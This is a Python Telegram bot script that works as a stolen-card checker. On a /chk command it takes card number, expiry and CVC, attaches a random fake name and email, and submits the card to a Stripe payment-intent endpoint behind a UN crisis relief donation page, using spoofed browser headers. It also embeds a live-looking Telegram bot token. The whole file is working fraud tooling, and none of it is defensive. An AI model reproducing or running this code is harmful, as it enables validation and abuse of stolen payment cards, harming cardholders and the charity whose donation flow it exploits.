import requests
import telebot

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
TELEGRAM_BOT_TOKEN = '6126045919:AAEo-9ddN2PvlzWtnWtyUbkxQCUpSyXLKVg'
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Function to fetch random user details
def get_random_user():
    response = requests.get('https://randomuser.me/api/')
    if response.status_code == 200:
        user_data = response.json()['results'][0]
        name = f"{user_data['name']['first']} {user_data['name']['last']}"
        email = user_data['email']
        return name, email
    else:
        return None, None

# Function to check payment status using Stripe API with cURL credentials
def check_payment(card_number, month, year, cvc):
    url = "https://api.stripe.com/v1/payment_intents/pi_3QWWtdIE1ijOzIgP0JOnGvJj/confirm"
    headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    }
    name, email = get_random_user()
    data = {
        "return_url": "https://crisisrelief.un.org/donate",
        "payment_method_data[billing_details][name]": name,
        "payment_method_data[billing_details][email]": email,
        "payment_method_data[card][number]": card_number,
        "payment_method_data[card][exp_month]": month,
        "payment_method_data[card][exp_year]": year,
        "payment_method_data[card][cvc]": cvc
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

# Command handler for /chk
@bot.message_handler(commands=['chk'])
def chk(message):
    card_details = message.text.split()[1].split('|')
    if len(card_details) == 4:
        card_number, month, year, cvc = card_details
        payment_response = check_payment(card_number, month, year, cvc)
        bot.reply_to(message, f"Payment Response: {payment_response}")
    else:
        bot.reply_to(message, "Please provide card details in the format: /chk card_number|month|year|cvc")

# Start the bot
bot.polling()
